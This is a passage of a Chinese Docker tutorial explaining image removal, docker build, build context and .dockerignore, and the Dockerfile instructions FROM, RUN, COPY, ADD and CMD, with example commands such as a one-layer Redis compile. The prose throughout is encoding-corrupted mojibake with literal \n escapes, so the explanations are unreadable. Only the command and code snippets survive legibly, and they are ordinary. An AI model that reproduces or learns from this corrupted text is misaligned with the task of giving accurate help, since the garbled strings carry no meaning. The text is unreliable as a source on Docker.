åˆ é™¤æœ¬åœ°é•œåƒ\n\nå¦‚æœè¦åˆ é™¤æœ¬åœ°çš„é•œåƒï¼Œå¯ä»¥ä½¿ç”¨ `docker image rm` å‘½ä»¤ï¼Œå…¶æ ¼å¼ä¸ºï¼š\n\n```\n$ docker image rm [é€‰é¡¹] <é•œåƒ1> [<é•œåƒ2> ...]\n```\n\n####  \n\n# 3. Dockerfile å®šåˆ¶é•œåƒ\n\nDockerfile æ˜¯ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ï¼Œå…¶å†…åŒ…å«äº†ä¸€æ¡æ¡çš„**æŒ‡ä»¤(Instruction)**ï¼Œæ¯ä¸€æ¡æŒ‡ä»¤æ„å»ºä¸€å±‚ï¼Œå› æ­¤æ¯ä¸€æ¡æŒ‡ä»¤çš„å†…å®¹ï¼Œå°±æ˜¯æè¿°è¯¥å±‚åº”å½“å¦‚ä½•æ„å»ºã€‚\n\n\n\n### 3.1 æ„å»ºé•œåƒ\n\nåœ¨Â `Dockerfile`Â æ–‡ä»¶æ‰€åœ¨ç›®å½•æ‰§è¡Œï¼š\n\n```\n$ docker build -t nginx:v3 .\n```\n\n\n\nè¿™é‡Œæˆ‘ä»¬ä½¿ç”¨äº† `docker build` å‘½ä»¤è¿›è¡Œé•œåƒæ„å»ºã€‚å…¶æ ¼å¼ä¸ºï¼š\n\n```\ndocker build [é€‰é¡¹] <ä¸Šä¸‹æ–‡è·¯å¾„/URL/->\n```\n\n\n\n### 3.2 é•œåƒæ„å»ºä¸Šä¸‹æ–‡ï¼ˆContextï¼‰ \n\nä¸Šä¸‹æ–‡è·¯å¾„å°±æ˜¯ docker build æŒ‡å®šçš„\n\nå¦‚æœæ³¨æ„ï¼Œä¼šçœ‹åˆ°Â `docker build`Â å‘½ä»¤æœ€åæœ‰ä¸€ä¸ªÂ `.`ã€‚`.`Â è¡¨ç¤ºå½“å‰ç›®å½•ï¼Œè€ŒÂ `Dockerfile`Â å°±åœ¨å½“å‰ç›®å½•ï¼Œå› æ­¤ä¸å°‘åˆå­¦è€…ä»¥ä¸ºè¿™ä¸ªè·¯å¾„æ˜¯åœ¨æŒ‡å®šÂ `Dockerfile`Â æ‰€åœ¨è·¯å¾„ï¼Œè¿™ä¹ˆç†è§£å…¶å®æ˜¯ä¸å‡†ç¡®çš„ã€‚å¦‚æœå¯¹åº”ä¸Šé¢çš„å‘½ä»¤æ ¼å¼ï¼Œä½ å¯èƒ½ä¼šå‘ç°ï¼Œè¿™æ˜¯åœ¨æŒ‡å®š**ä¸Šä¸‹æ–‡è·¯å¾„**ã€‚é‚£ä¹ˆä»€ä¹ˆæ˜¯ä¸Šä¸‹æ–‡å‘¢ï¼Ÿ\n\n\n\né¦–å…ˆæˆ‘ä»¬è¦ç†è§£ `docker build` çš„å·¥ä½œåŸç†ã€‚Docker åœ¨è¿è¡Œæ—¶åˆ†ä¸º Docker å¼•æ“ï¼ˆä¹Ÿå°±æ˜¯æœåŠ¡ç«¯å®ˆæŠ¤è¿›ç¨‹ï¼‰å’Œå®¢æˆ·ç«¯å·¥å…·ã€‚Docker çš„å¼•æ“æä¾›äº†ä¸€ç»„ REST APIï¼Œè¢«ç§°ä¸º Docker Remote APIï¼Œè€Œå¦‚ docker å‘½ä»¤è¿™æ ·çš„å®¢æˆ·ç«¯å·¥å…·ï¼Œåˆ™æ˜¯é€šè¿‡è¿™ç»„ API ä¸ Docker å¼•æ“äº¤äº’ï¼Œä»è€Œå®Œæˆå„ç§åŠŸèƒ½ã€‚å› æ­¤ï¼Œè™½ç„¶è¡¨é¢ä¸Šæˆ‘ä»¬å¥½åƒæ˜¯åœ¨æœ¬æœºæ‰§è¡Œå„ç§ `docker` åŠŸèƒ½ï¼Œä½†å®é™…ä¸Šï¼Œä¸€åˆ‡éƒ½æ˜¯ä½¿ç”¨çš„è¿œç¨‹è°ƒç”¨å½¢å¼åœ¨æœåŠ¡ç«¯ï¼ˆDocker å¼•æ“ï¼‰å®Œæˆã€‚ä¹Ÿå› ä¸ºè¿™ç§ C/S è®¾è®¡ï¼Œè®©æˆ‘ä»¬æ“ä½œè¿œç¨‹æœåŠ¡å™¨çš„ Docker å¼•æ“å˜å¾—è½»è€Œæ˜“ä¸¾ã€‚\n\n\n\nå½“æˆ‘ä»¬è¿›è¡Œé•œåƒæ„å»ºçš„æ—¶å€™ï¼Œå¹¶éæ‰€æœ‰å®šåˆ¶éƒ½ä¼šé€šè¿‡ `RUN` æŒ‡ä»¤å®Œæˆï¼Œç»å¸¸ä¼šéœ€è¦å°†ä¸€äº›æœ¬åœ°æ–‡ä»¶å¤åˆ¶è¿›é•œåƒï¼Œæ¯”å¦‚é€šè¿‡ `COPY` æŒ‡ä»¤ã€`ADD` æŒ‡ä»¤ç­‰ã€‚è€Œ `docker build` å‘½ä»¤æ„å»ºé•œåƒï¼Œå…¶å®å¹¶éåœ¨æœ¬åœ°æ„å»ºï¼Œè€Œæ˜¯åœ¨æœåŠ¡ç«¯ï¼Œä¹Ÿå°±æ˜¯ Docker å¼•æ“ä¸­æ„å»ºçš„ã€‚é‚£ä¹ˆåœ¨è¿™ç§å®¢æˆ·ç«¯/æœåŠ¡ç«¯çš„æ¶æ„ä¸­ï¼Œå¦‚ä½•æ‰èƒ½è®©æœåŠ¡ç«¯è·å¾—æœ¬åœ°æ–‡ä»¶å‘¢ï¼Ÿ\n\n \n\nè¿™å°±å¼•å…¥äº†ä¸Šä¸‹æ–‡çš„æ¦‚å¿µã€‚å½“æ„å»ºçš„æ—¶å€™ï¼Œç”¨æˆ·ä¼šæŒ‡å®šæ„å»ºé•œåƒä¸Šä¸‹æ–‡çš„è·¯å¾„ï¼Œ`docker build`Â å‘½ä»¤å¾—çŸ¥è¿™ä¸ªè·¯å¾„åï¼Œä¼šå°†è·¯å¾„ä¸‹çš„æ‰€æœ‰å†…å®¹æ‰“åŒ…ï¼Œç„¶åä¸Šä¼ ç»™ Docker å¼•æ“ã€‚è¿™æ · Docker å¼•æ“æ”¶åˆ°è¿™ä¸ªä¸Šä¸‹æ–‡åŒ…åï¼Œå±•å¼€å°±ä¼šè·å¾—æ„å»ºé•œåƒæ‰€éœ€çš„ä¸€åˆ‡æ–‡ä»¶ã€‚\n\n\n\nå¦‚æœåœ¨ `Dockerfile` ä¸­è¿™ä¹ˆå†™ï¼š\n\n```\nCOPY ./package.json /app/ \n```\n\nè¿™å¹¶ä¸æ˜¯è¦å¤åˆ¶æ‰§è¡Œ `docker build` å‘½ä»¤æ‰€åœ¨çš„ç›®å½•ä¸‹çš„ `package.json`ï¼Œä¹Ÿä¸æ˜¯å¤åˆ¶ `Dockerfile` æ‰€åœ¨ç›®å½•ä¸‹çš„ `package.json`ï¼Œè€Œæ˜¯å¤åˆ¶ **ä¸Šä¸‹æ–‡ï¼ˆcontextï¼‰** ç›®å½•ä¸‹çš„ `package.json`ã€‚\n\n \n\nå› æ­¤ï¼Œ`COPY`Â è¿™ç±»æŒ‡ä»¤ä¸­çš„æºæ–‡ä»¶çš„è·¯å¾„éƒ½æ˜¯*ç›¸å¯¹è·¯å¾„*ã€‚è¿™ä¹Ÿæ˜¯åˆå­¦è€…ç»å¸¸ä¼šé—®çš„ä¸ºä»€ä¹ˆÂ `COPY ../package.json /app`Â æˆ–è€…Â `COPY /opt/xxxx /app`Â æ— æ³•å·¥ä½œçš„åŸå› ï¼Œå› ä¸ºè¿™äº›è·¯å¾„å·²ç»è¶…å‡ºäº†ä¸Šä¸‹æ–‡çš„èŒƒå›´ï¼ŒDocker å¼•æ“æ— æ³•è·å¾—è¿™äº›ä½ç½®çš„æ–‡ä»¶ã€‚å¦‚æœçœŸçš„éœ€è¦é‚£äº›æ–‡ä»¶ï¼Œåº”è¯¥å°†å®ƒä»¬å¤åˆ¶åˆ°ä¸Šä¸‹æ–‡ç›®å½•ä¸­å»ã€‚\n\n\n\nç°åœ¨å°±å¯ä»¥ç†è§£åˆšæ‰çš„å‘½ä»¤ `docker build -t nginx:v3 .` ä¸­çš„è¿™ä¸ª `.`ï¼Œå®é™…ä¸Šæ˜¯åœ¨æŒ‡å®šä¸Šä¸‹æ–‡çš„ç›®å½•ï¼Œ`docker build` å‘½ä»¤ä¼šå°†è¯¥ç›®å½•ä¸‹çš„å†…å®¹æ‰“åŒ…äº¤ç»™ Docker å¼•æ“ä»¥å¸®åŠ©æ„å»ºé•œåƒã€‚\n\n\n\n ç†è§£æ„å»ºä¸Šä¸‹æ–‡å¯¹äºé•œåƒæ„å»ºæ˜¯å¾ˆé‡è¦çš„ï¼Œé¿å…çŠ¯ä¸€äº›ä¸åº”è¯¥çš„é”™è¯¯ã€‚æ¯”å¦‚æœ‰äº›åˆå­¦è€…åœ¨å‘ç° `COPY /opt/xxxx /app` ä¸å·¥ä½œåï¼Œäºæ˜¯å¹²è„†å°† `Dockerfile` æ”¾åˆ°äº†ç¡¬ç›˜æ ¹ç›®å½•å»æ„å»ºï¼Œç»“æœå‘ç° `docker build` æ‰§è¡Œåï¼Œåœ¨å‘é€ä¸€ä¸ªå‡ å GB çš„ä¸œè¥¿ï¼Œæä¸ºç¼“æ…¢è€Œä¸”å¾ˆå®¹æ˜“æ„å»ºå¤±è´¥ã€‚é‚£æ˜¯å› ä¸ºè¿™ç§åšæ³•æ˜¯åœ¨è®© `docker build` æ‰“åŒ…æ•´ä¸ªç¡¬ç›˜ï¼Œè¿™æ˜¾ç„¶æ˜¯ä½¿ç”¨é”™è¯¯ã€‚\n\n\n\nä¸€èˆ¬æ¥è¯´ï¼Œåº”è¯¥ä¼šå°†Â `Dockerfile`Â ç½®äºä¸€ä¸ªç©ºç›®å½•ä¸‹ï¼Œæˆ–è€…é¡¹ç›®æ ¹ç›®å½•ä¸‹ã€‚å¦‚æœè¯¥ç›®å½•ä¸‹æ²¡æœ‰æ‰€éœ€æ–‡ä»¶ï¼Œé‚£ä¹ˆåº”è¯¥æŠŠæ‰€éœ€æ–‡ä»¶å¤åˆ¶ä¸€ä»½è¿‡æ¥ã€‚å¦‚æœç›®å½•ä¸‹æœ‰äº›ä¸œè¥¿ç¡®å®ä¸å¸Œæœ›æ„å»ºæ—¶ä¼ ç»™ Docker å¼•æ“ï¼Œé‚£ä¹ˆå¯ä»¥ç”¨Â `.gitignore`Â ä¸€æ ·çš„è¯­æ³•å†™ä¸€ä¸ªÂ `.dockerignore`ï¼Œè¯¥æ–‡ä»¶æ˜¯ç”¨äºå‰”é™¤ä¸éœ€è¦ä½œä¸ºä¸Šä¸‹æ–‡ä¼ é€’ç»™ Docker å¼•æ“çš„ã€‚ \n\n\n\né‚£ä¹ˆä¸ºä»€ä¹ˆä¼šæœ‰äººè¯¯ä»¥ä¸º `.` æ˜¯æŒ‡å®š `Dockerfile` æ‰€åœ¨ç›®å½•å‘¢ï¼Ÿè¿™æ˜¯å› ä¸ºåœ¨é»˜è®¤æƒ…å†µä¸‹ï¼Œå¦‚æœä¸é¢å¤–æŒ‡å®š `Dockerfile` çš„è¯ï¼Œä¼šå°†ä¸Šä¸‹æ–‡ç›®å½•ä¸‹çš„åä¸º `Dockerfile` çš„æ–‡ä»¶ä½œä¸º Dockerfileã€‚\n\n\n\nè¿™åªæ˜¯é»˜è®¤è¡Œä¸ºï¼Œå®é™…ä¸Š `Dockerfile` çš„æ–‡ä»¶åå¹¶ä¸è¦æ±‚å¿…é¡»ä¸º `Dockerfile`ï¼Œè€Œä¸”å¹¶ä¸è¦æ±‚å¿…é¡»ä½äºä¸Šä¸‹æ–‡ç›®å½•ä¸­ï¼Œæ¯”å¦‚å¯ä»¥ç”¨ `-f ../Dockerfile.php` å‚æ•°æŒ‡å®šæŸä¸ªæ–‡ä»¶ä½œä¸º `Dockerfile`ã€‚\n\n \n\nå½“ç„¶ï¼Œä¸€èˆ¬å¤§å®¶ä¹ æƒ¯æ€§çš„ä¼šä½¿ç”¨é»˜è®¤çš„æ–‡ä»¶å `Dockerfile`ï¼Œä»¥åŠä¼šå°†å…¶ç½®äºé•œåƒæ„å»ºä¸Šä¸‹æ–‡ç›®å½•ä¸­ã€‚\n\n\n\n### 3.3 dockerfile æŒ‡ä»¤\n\n+ FROM æŒ‡å®šåŸºç¡€é•œåƒ\n\næ‰€è°“å®šåˆ¶é•œåƒï¼Œé‚£ä¸€å®šæ˜¯ä»¥ä¸€ä¸ªé•œåƒä¸ºåŸºç¡€ï¼Œåœ¨å…¶ä¸Šè¿›è¡Œå®šåˆ¶ã€‚å°±åƒæˆ‘ä»¬ä¹‹å‰è¿è¡Œäº†ä¸€ä¸ªÂ `nginx`Â é•œåƒçš„å®¹å™¨ï¼Œå†è¿›è¡Œä¿®æ”¹ä¸€æ ·ï¼ŒåŸºç¡€é•œåƒæ˜¯å¿…é¡»æŒ‡å®šçš„ã€‚è€ŒÂ `FROM`Â å°±æ˜¯æŒ‡å®š**åŸºç¡€é•œåƒ**ï¼Œå› æ­¤ä¸€ä¸ªÂ `Dockerfile`Â ä¸­Â `FROM`Â æ˜¯å¿…å¤‡çš„æŒ‡ä»¤ï¼Œå¹¶ä¸”å¿…é¡»æ˜¯ç¬¬ä¸€æ¡æŒ‡ä»¤ã€‚\n\nåœ¨ Docker Store ä¸Šæœ‰éå¸¸å¤šçš„é«˜è´¨é‡çš„å®˜æ–¹é•œåƒï¼Œæœ‰å¯ä»¥ç›´æ¥æ‹¿æ¥ä½¿ç”¨çš„æœåŠ¡ç±»çš„é•œåƒï¼Œå¦‚ nginxã€redisã€mongoã€mysqlã€httpdã€phpã€tomcat ç­‰ï¼›ä¹Ÿæœ‰ä¸€äº›æ–¹ä¾¿å¼€å‘ã€æ„å»ºã€è¿è¡Œå„ç§è¯­è¨€åº”ç”¨çš„é•œåƒï¼Œå¦‚ nodeã€openjdkã€pythonã€rubyã€golang ç­‰ã€‚å¯ä»¥åœ¨å…¶ä¸­å¯»æ‰¾ä¸€ä¸ªæœ€ç¬¦åˆæˆ‘ä»¬æœ€ç»ˆç›®æ ‡çš„é•œåƒä¸ºåŸºç¡€é•œåƒè¿›è¡Œå®šåˆ¶ã€‚\n\n\n\nå¦‚æœæ²¡æœ‰æ‰¾åˆ°å¯¹åº”æœåŠ¡çš„é•œåƒï¼Œå®˜æ–¹é•œåƒä¸­è¿˜æä¾›äº†ä¸€äº›æ›´ä¸ºåŸºç¡€çš„æ“ä½œç³»ç»Ÿé•œåƒï¼Œå¦‚ ubuntuã€debianã€centosã€fedoraã€alpine ç­‰ï¼Œè¿™äº›æ“ä½œç³»ç»Ÿçš„è½¯ä»¶åº“ä¸ºæˆ‘ä»¬æä¾›äº†æ›´å¹¿é˜”çš„æ‰©å±•ç©ºé—´ã€‚\n\né™¤äº†é€‰æ‹©ç°æœ‰é•œåƒä¸ºåŸºç¡€é•œåƒå¤–ï¼ŒDocker è¿˜å­˜åœ¨ä¸€ä¸ªç‰¹æ®Šçš„é•œåƒï¼Œåä¸º scratchã€‚è¿™ä¸ªé•œåƒæ˜¯è™šæ‹Ÿçš„æ¦‚å¿µï¼Œå¹¶ä¸å®é™…å­˜åœ¨ï¼Œå®ƒè¡¨ç¤ºä¸€ä¸ªç©ºç™½çš„é•œåƒã€‚\n\n+ RUN æ‰§è¡Œå‘½ä»¤\n\n`RUN` æŒ‡ä»¤æ˜¯ç”¨æ¥æ‰§è¡Œå‘½ä»¤è¡Œå‘½ä»¤çš„ã€‚ç”±äºå‘½ä»¤è¡Œçš„å¼ºå¤§èƒ½åŠ›ï¼Œ`RUN` æŒ‡ä»¤åœ¨å®šåˆ¶é•œåƒæ—¶æ˜¯æœ€å¸¸ç”¨çš„æŒ‡ä»¤ä¹‹ä¸€ã€‚å…¶æ ¼å¼æœ‰ä¸¤ç§ï¼š\n\n\n+ shell æ ¼å¼ï¼š`RUN <å‘½ä»¤>`ï¼Œå°±åƒç›´æ¥åœ¨å‘½ä»¤è¡Œä¸­è¾“å…¥çš„å‘½ä»¤ä¸€æ ·ã€‚åˆšæ‰å†™çš„ Dockerfile ä¸­çš„ `RUN` æŒ‡ä»¤å°±æ˜¯è¿™ç§æ ¼å¼ã€‚\n\n```\nRUN echo '<h1>Hello, Docker!</h1>' > /usr/share/nginx/html/index.html\n```\n\n- exec æ ¼å¼ï¼š`RUN [\"å¯æ‰§è¡Œæ–‡ä»¶\", \"å‚æ•°1\", \"å‚æ•°2\"]`ï¼Œè¿™æ›´åƒæ˜¯å‡½æ•°è°ƒç”¨ä¸­çš„æ ¼å¼ã€‚\n\n \n\nä¹‹å‰è¯´è¿‡ï¼ŒDockerfile ä¸­æ¯ä¸€ä¸ªæŒ‡ä»¤éƒ½ä¼šå»ºç«‹ä¸€å±‚ï¼Œ`RUN` ä¹Ÿä¸ä¾‹å¤–ã€‚æ¯ä¸€ä¸ª `RUN` çš„è¡Œä¸ºï¼Œå°±å’Œåˆšæ‰æˆ‘ä»¬æ‰‹å·¥å»ºç«‹é•œåƒçš„è¿‡ç¨‹ä¸€æ ·ï¼šæ–°å»ºç«‹ä¸€å±‚ï¼Œåœ¨å…¶ä¸Šæ‰§è¡Œè¿™äº›å‘½ä»¤ï¼Œæ‰§è¡Œç»“æŸåï¼Œ`commit` è¿™ä¸€å±‚çš„ä¿®æ”¹ï¼Œæ„æˆæ–°çš„é•œåƒã€‚\n\n\n\n```\nFROM debian:jessie\n\nRUN buildDeps='gcc libc6-dev make' \\\n    && apt-get update \\\n    && apt-get install -y $buildDeps \\\n    && wget -O redis.tar.gz \"http://download.redis.io/releases/redis-3.2.5.tar.gz\" \\\n    && mkdir -p /usr/src/redis \\\n    && tar -xzf redis.tar.gz -C /usr/src/redis --strip-components=1 \\\n    && make -C /usr/src/redis \\\n    && make -C /usr/src/redis install \\\n    && rm -rf /var/lib/apt/lists/* \\\n    && rm redis.tar.gz \\\n    && rm -r /usr/src/redis \\\n    && apt-get purge -y --auto-remove $buildDeps\n```\n\n\n\n é¦–å…ˆï¼Œä¹‹å‰æ‰€æœ‰çš„å‘½ä»¤åªæœ‰ä¸€ä¸ªç›®çš„ï¼Œå°±æ˜¯ç¼–è¯‘ã€å®‰è£… redis å¯æ‰§è¡Œæ–‡ä»¶ã€‚å› æ­¤æ²¡æœ‰å¿…è¦å»ºç«‹å¾ˆå¤šå±‚ï¼Œè¿™åªæ˜¯ä¸€å±‚çš„äº‹æƒ…ã€‚å› æ­¤ï¼Œè¿™é‡Œæ²¡æœ‰ä½¿ç”¨å¾ˆå¤šä¸ª `RUN` å¯¹ä¸€ä¸€å¯¹åº”ä¸åŒçš„å‘½ä»¤ï¼Œè€Œæ˜¯ä»…ä»…ä½¿ç”¨ä¸€ä¸ª `RUN` æŒ‡ä»¤ï¼Œå¹¶ä½¿ç”¨ `&&` å°†å„ä¸ªæ‰€éœ€å‘½ä»¤ä¸²è”èµ·æ¥ã€‚å°†ä¹‹å‰çš„ 7 å±‚ï¼Œç®€åŒ–ä¸ºäº† 1 å±‚ã€‚åœ¨æ’°å†™ Dockerfile çš„æ—¶å€™ï¼Œè¦ç»å¸¸æé†’è‡ªå·±ï¼Œè¿™å¹¶ä¸æ˜¯åœ¨å†™ Shell è„šæœ¬ï¼Œè€Œæ˜¯åœ¨å®šä¹‰æ¯ä¸€å±‚è¯¥å¦‚ä½•æ„å»ºã€‚\n\n\n\nå¹¶ä¸”ï¼Œè¿™é‡Œä¸ºäº†æ ¼å¼åŒ–è¿˜è¿›è¡Œäº†æ¢è¡Œã€‚Dockerfile æ”¯æŒ Shell ç±»çš„è¡Œå°¾æ·»åŠ  `\\` çš„å‘½ä»¤æ¢è¡Œæ–¹å¼ï¼Œä»¥åŠè¡Œé¦– `#` è¿›è¡Œæ³¨é‡Šçš„æ ¼å¼ã€‚è‰¯å¥½çš„æ ¼å¼ï¼Œæ¯”å¦‚æ¢è¡Œã€ç¼©è¿›ã€æ³¨é‡Šç­‰ï¼Œä¼šè®©ç»´æŠ¤ã€æ’éšœæ›´ä¸ºå®¹æ˜“ï¼Œè¿™æ˜¯ä¸€ä¸ªæ¯”è¾ƒå¥½çš„ä¹ æƒ¯ã€‚\n\n  \n\næ­¤å¤–ï¼Œè¿˜å¯ä»¥çœ‹åˆ°è¿™ä¸€ç»„å‘½ä»¤çš„æœ€åæ·»åŠ äº†æ¸…ç†å·¥ä½œçš„å‘½ä»¤ï¼Œåˆ é™¤äº†ä¸ºäº†ç¼–è¯‘æ„å»ºæ‰€éœ€è¦çš„è½¯ä»¶ï¼Œæ¸…ç†äº†æ‰€æœ‰ä¸‹è½½ã€å±•å¼€çš„æ–‡ä»¶ï¼Œå¹¶ä¸”è¿˜æ¸…ç†äº† `apt` ç¼“å­˜æ–‡ä»¶ã€‚è¿™æ˜¯å¾ˆé‡è¦çš„ä¸€æ­¥ï¼Œæˆ‘ä»¬ä¹‹å‰è¯´è¿‡ï¼Œé•œåƒæ˜¯å¤šå±‚å­˜å‚¨ï¼Œæ¯ä¸€å±‚çš„ä¸œè¥¿å¹¶ä¸ä¼šåœ¨ä¸‹ä¸€å±‚è¢«åˆ é™¤ï¼Œä¼šä¸€ç›´è·Ÿéšç€é•œåƒã€‚å› æ­¤é•œåƒæ„å»ºæ—¶ï¼Œä¸€å®šè¦ç¡®ä¿æ¯ä¸€å±‚åªæ·»åŠ çœŸæ­£éœ€è¦æ·»åŠ çš„ä¸œè¥¿ï¼Œä»»ä½•æ— å…³çš„ä¸œè¥¿éƒ½åº”è¯¥æ¸…ç†æ‰ã€‚\n\n\n\n+ COPY å¤åˆ¶æ–‡ä»¶\n\næ ¼å¼ï¼š\n\n- `COPY <æºè·¯å¾„>... <ç›®æ ‡è·¯å¾„>`\n- `COPY [\"<æºè·¯å¾„1>\",... \"<ç›®æ ‡è·¯å¾„>\"]`\n\n\n\n`COPY` æŒ‡ä»¤å°†ä»æ„å»ºä¸Šä¸‹æ–‡ç›®å½•ä¸­ `<æºè·¯å¾„>` çš„æ–‡ä»¶/ç›®å½•å¤åˆ¶åˆ°æ–°çš„ä¸€å±‚çš„é•œåƒå†…çš„ `<ç›®æ ‡è·¯å¾„>` ä½ç½®ã€‚æ¯”å¦‚ï¼š\n\n```\nCOPY package.json /usr/src/app/\n```\n\n`<æºè·¯å¾„>` å¯ä»¥æ˜¯å¤šä¸ªï¼Œç”šè‡³å¯ä»¥æ˜¯é€šé…ç¬¦ï¼Œå…¶é€šé…ç¬¦è§„åˆ™è¦æ»¡è¶³ Go çš„ filepath.Match è§„åˆ™ï¼Œå¦‚ï¼š\n\n```\nCOPY hom* /mydir/\nCOPY hom?.txt /mydir/\n```\n\n\n\n`<ç›®æ ‡è·¯å¾„>` å¯ä»¥æ˜¯å®¹å™¨å†…çš„ç»å¯¹è·¯å¾„ï¼Œä¹Ÿå¯ä»¥æ˜¯ç›¸å¯¹äºå·¥ä½œç›®å½•çš„ç›¸å¯¹è·¯å¾„ï¼ˆå·¥ä½œç›®å½•å¯ä»¥ç”¨ `WORKDIR`æŒ‡ä»¤æ¥æŒ‡å®šï¼‰ã€‚ç›®æ ‡è·¯å¾„ä¸éœ€è¦äº‹å…ˆåˆ›å»ºï¼Œå¦‚æœç›®å½•ä¸å­˜åœ¨ä¼šåœ¨å¤åˆ¶æ–‡ä»¶å‰å…ˆè¡Œåˆ›å»ºç¼ºå¤±ç›®å½•ã€‚\n\næ­¤å¤–ï¼Œè¿˜éœ€è¦æ³¨æ„ä¸€ç‚¹ï¼Œä½¿ç”¨ `COPY` æŒ‡ä»¤ï¼Œæºæ–‡ä»¶çš„å„ç§å…ƒæ•°æ®éƒ½ä¼šä¿ç•™ã€‚æ¯”å¦‚è¯»ã€å†™ã€æ‰§è¡Œæƒé™ã€æ–‡ä»¶å˜æ›´æ—¶é—´ç­‰ã€‚è¿™ä¸ªç‰¹æ€§å¯¹äºé•œåƒå®šåˆ¶å¾ˆæœ‰ç”¨ã€‚ç‰¹åˆ«æ˜¯æ„å»ºç›¸å…³æ–‡ä»¶éƒ½åœ¨ä½¿ç”¨ Git è¿›è¡Œç®¡ç†çš„æ—¶å€™ã€‚\n\n\n\n+ ADD æ›´é«˜çº§çš„å¤åˆ¶æ–‡ä»¶\n\n`ADD` æŒ‡ä»¤å’Œ `COPY` çš„æ ¼å¼å’Œæ€§è´¨åŸºæœ¬ä¸€è‡´ã€‚ä½†æ˜¯åœ¨ `COPY` åŸºç¡€ä¸Šå¢åŠ äº†ä¸€äº›åŠŸèƒ½ã€‚\n\n\n\n æ¯”å¦‚Â `<æºè·¯å¾„>`Â å¯ä»¥æ˜¯ä¸€ä¸ªÂ `URL`ï¼Œè¿™ç§æƒ…å†µä¸‹ï¼ŒDocker å¼•æ“ä¼šè¯•å›¾å»ä¸‹è½½è¿™ä¸ªé“¾æ¥çš„æ–‡ä»¶æ”¾åˆ°Â `<ç›®æ ‡è·¯å¾„>`Â å»ã€‚ä¸‹è½½åçš„æ–‡ä»¶æƒé™è‡ªåŠ¨è®¾ç½®ä¸ºÂ `600`ï¼Œå¦‚æœè¿™å¹¶ä¸æ˜¯æƒ³è¦çš„æƒé™ï¼Œé‚£ä¹ˆè¿˜éœ€è¦å¢åŠ é¢å¤–çš„ä¸€å±‚Â `RUN`è¿›è¡Œæƒé™è°ƒæ•´ï¼Œå¦å¤–ï¼Œå¦‚æœä¸‹è½½çš„æ˜¯ä¸ªå‹ç¼©åŒ…ï¼Œéœ€è¦è§£å‹ç¼©ï¼Œä¹Ÿä¸€æ ·è¿˜éœ€è¦é¢å¤–çš„ä¸€å±‚Â `RUN`Â æŒ‡ä»¤è¿›è¡Œè§£å‹ç¼©ã€‚æ‰€ä»¥ä¸å¦‚ç›´æ¥ä½¿ç”¨Â `RUN`Â æŒ‡ä»¤ï¼Œç„¶åä½¿ç”¨Â `wget`Â æˆ–è€…Â `curl`Â å·¥å…·ä¸‹è½½ï¼Œå¤„ç†æƒé™ã€è§£å‹ç¼©ã€ç„¶åæ¸…ç†æ— ç”¨æ–‡ä»¶æ›´åˆç†ã€‚å› æ­¤ï¼Œè¿™ä¸ªåŠŸèƒ½å…¶å®å¹¶ä¸å®ç”¨ï¼Œè€Œä¸”ä¸æ¨èä½¿ç”¨ã€‚\n\n\n\n+ CMD å®¹å™¨å¯åŠ¨å‘½ä»¤ \n\n`CMD` æŒ‡ä»¤çš„æ ¼å¼å’Œ `RUN` ç›¸ä¼¼ï¼Œä¹Ÿæ˜¯ä¸¤ç§æ ¼å¼ï¼š\n\n- `shell` æ ¼å¼ï¼š`CMD <å‘½ä»¤>`\n\n- `exec` æ ¼å¼ï¼š`CMD [\"å¯æ‰§è¡Œæ–‡ä»¶\", \"å‚æ•°1\", \"å‚æ•°2\"...]`\n\n- å‚æ•°åˆ—è¡¨æ ¼å¼ï¼š`CMD [\"å‚æ•°1\", \"å‚æ•°2\"...]`ã€‚åœ¨æŒ‡å®šäº† `ENTRYPOINT` æŒ‡ä»¤åï¼Œç”¨ `CMD` æŒ‡å®šå…·ä½“çš„å‚æ•°ã€‚\n\n  \n\nä¹‹å‰ä»‹ç»å®¹å™¨çš„æ—¶å€™æ›¾ç»è¯´è¿‡ï¼ŒDocker ä¸æ˜¯è™šæ‹Ÿæœºï¼Œå®¹å™¨å°±æ˜¯è¿›ç¨‹ã€‚æ—¢ç„¶æ˜¯è¿›ç¨‹ï¼Œé‚£ä¹ˆåœ¨å¯åŠ¨å®¹å™¨çš„æ—¶å€™ï¼Œéœ€è¦æŒ‡å®šæ‰€è¿è¡Œçš„ç¨‹åºåŠå‚æ•°ã€‚`CMD` æŒ‡ä»¤å°±æ˜¯ç”¨äºæŒ‡å®šé»˜è®¤çš„å®¹å™¨ä¸»è¿›ç¨‹çš„å¯åŠ¨å‘½ä»¤çš„ã€‚\n\n \n\nåœ¨è¿è¡Œæ—¶å¯ä»¥æŒ‡å®šæ–°çš„å‘½ä»¤æ¥æ›¿ä»£é•œåƒè®¾ç½®ä¸­çš„è¿™ä¸ªé»˜è®¤å‘½ä»¤ï¼Œæ¯”å¦‚ï¼Œ`ubuntu`Â é•œåƒé»˜è®¤çš„Â `CMD`Â æ˜¯Â `/bin/bash`ï¼Œå¦‚æœæˆ‘ä»¬ç›´æ¥Â `docker run -it ubuntu`Â çš„è¯ï¼Œä¼šç›´æ¥è¿›å…¥Â `bash`ã€‚æˆ‘ä»¬ä¹Ÿå¯ä»¥åœ¨è¿è¡Œæ—¶æŒ‡å®šè¿è¡Œåˆ«çš„å‘½ä»¤ï¼Œå¦‚Â `docker run -it ubuntu cat /etc/os-release`ã€‚è¿™å°±æ˜¯ç”¨Â `cat /etc/os-release`Â å‘½ä»¤æ›¿æ¢äº†é»˜è®¤çš„Â `/bin/bash`Â å‘½ä»¤äº†ï¼Œè¾“å‡ºäº†ç³»ç»Ÿç‰ˆæœ¬ä¿¡æ¯ã€‚\n\n\n\nåœ¨æŒ‡ä»¤æ ¼å¼ä¸Šï¼Œä¸€èˆ¬æ¨èä½¿ç”¨ `exec` æ ¼å¼ï¼Œè¿™ç±»æ ¼å¼åœ¨è§£ææ—¶ä¼šè¢«è§£æä¸º JSON æ•°ç»„ï¼Œå› æ­¤ä¸€å®šè¦ä½¿ç”¨åŒå¼•å· `\"`ï¼Œè€Œä¸è¦ä½¿ç”¨å•å¼•å·ã€‚\n\n\n\nå¦‚æœä½¿ç”¨ `shell` æ ¼å¼çš„è¯ï¼Œå®é™…çš„å‘½ä»¤ä¼šè¢«åŒ…è£…ä¸º `sh -c` çš„å‚æ•°çš„å½¢å¼è¿›è¡Œæ‰§è¡Œã€‚æ¯”å¦‚ï¼š\n\n```\nCMD echo $HOME\n```\n\nåœ¨å®é™…æ‰§è¡Œä¸­ï¼Œä¼šå°†å…¶å˜æ›´ä¸ºï¼š\n\n```\nCMD [ \"sh\", \"-c\", \"echo 